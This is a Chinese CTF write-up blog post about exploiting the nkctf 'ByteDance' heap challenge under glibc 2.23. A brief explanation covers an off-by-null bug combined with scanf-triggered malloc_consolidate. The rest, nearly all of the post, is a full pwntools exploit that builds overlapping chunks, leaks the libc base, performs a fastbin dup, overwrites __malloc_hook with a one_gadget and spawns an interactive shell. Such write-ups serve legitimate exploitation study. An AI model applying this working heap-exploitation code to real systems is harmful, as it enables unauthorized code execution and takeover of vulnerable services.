---
title: ByteDance
date: 2023-03-26 22:41:57
categories: 
- pwn_wp
tags: 
- pwn
- heap
- House_of_xxx

---

nkctf，利用off by null和**`scanf`在输入字符串较长时会调用`malloc`**的特性，最后get shell的过程类似`House of Orange`。

<!-- more -->

libc版本：2.23-0ubuntu11.3

会读一个随机数给堆指针加密，`read content`的时候有`off by null`，`chunk`最大0x40，最多0x20个chunk

和hctf2018的heapstrom_zero好像，学习一波。

使用`scanf`时，如 输入字符串比较长会调用`malloc`来分配内存，借此可以触发`malloc_consolidata`来合并`fast bin chunk`，这样`off by null`就有用了，把`size`改小来实现`overlapping`

```py
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
context.terminal = ['gnome-terminal','-x','bash','-c']
filename='pwn'
elf=ELF('./'+filename)
libc=ELF('/home/a1ph0nse/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
p=process('./'+filename)
# p = remote('node2.yuzhian.com.cn',32916)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))


def add(size,content):
    ru('Choice:')
    sl('1')
    ru('size:')
    sl(str(size))
    ru('content:')
    sl(content)

def view(idx):
    ru('Choice:')
    sl('2')
    ru('index:')
    sl(str(idx))

def dele(idx):
    ru('Choice:')
    sl('3')
    ru('index:')
    sl(str(idx))

def triger_consolidate():
    ru('Choice:')
    sl('1'*0x400) # malloc_consolidate

add(0x38,'a')#0

add(0x28,'a')#1
add(0x28,'a')#2
add(0x18,'a')#3
add(0x18,'a')#4
add(0x38,'x')#5
add(0x28,'x')#6
add(0x38,'x')#7
add(0x38,'x')#8
add(0x38,'x')#9
pay = b'a'*0x20+p64(0x200)+p64(0x20)
add(0x38,pay)#10

add(0x38,'end')#11

for i in range(1,11):
    dele(i)

triger_consolidate()

dele(0)
pay = b'a'*0x38
add(0x38,pay)#0

add(0x38,'a'*8)#1
add(0x38,'b'*8)#2
add(0x38,'c'*8)#3
add(0x38,'x')#4
add(0x38,'x')#5
add(0x28,'x')#6
add(0x38,'x')#7
add(0x38,'x')#8

dele(1)
dele(2)
dele(3)

triger_consolidate()
dele(11)
triger_consolidate()



add(0x28,'a')#1
add(0x28,'a')#2
add(0x18,'a')#3
add(0x18,'a')#9
add(0x38,'1'*0x30)#10
add(0x38,'2'*0x30)#11
add(0x28,'3'*0x30)#12
add(0x38,'4'*0x30)#13
add(0x38,'5'*0x30)#14
pay = b'a'*0x20+p64(0x200)+p64(0x20)
add(0x38,pay)#15

add(0x38,'end')#16

dele(1)
dele(2)
dele(3)
for i in range(9,16):
    dele(i)

triger_consolidate()

dele(0)
pay = b'a'*0x38
add(0x38,pay)#0

add(0x38,'a'*8)#1
add(0x38,'b'*8)#2
add(0x38,'c'*8)#3

view(4)
ru('Content: ')
lbase = u64(ru('\n')[:-1].ljust(8,b'\x00'))-0x3c4b20-88
leak('lbase:',hex(lbase))


dele(1)
dele(2)
dele(3)
triger_consolidate()

add(0x18,'A'*0x10)#1
add(0x28,'B'*0x20)#2
add(0x38,'C'*0x30)#3
add(0x18,'D'*0x10)#9

pay = p64(0)+p64(0x41)
add(0x18,pay)#6
add(0x28,'asd')
add(0x38,'zxc')#5,c
add(0x28,'qqq')#6,d


add(0x38,'a1')#14
add(0x28,'a2')#15

#fastbin dup
dele(5)
dele(14)
dele(0xc)

dele(6)
dele(15)
dele(0xd)


add(0x28,p64(0x41))
add(0x28,'a')
add(0x28,'a')

add(0x38,p64(lbase+0x3c4b20+8))
add(0x38,'a')
add(0x38,'a')
add(0x38,p64(lbase+0x3c4b20+8+0x20)+b'\x00'*0x10+p64(0x41))
add(0x38,b'\x00'*0x20+p64(lbase+libc.sym['__malloc_hook']-0x18))

add(0x18,'a'*0x18)
add(0x18,p64(lbase+0xf03a4)*2)

ru('Choice:')
sl('1')
ru('size:')
sl(str(0x18))

itr()
```

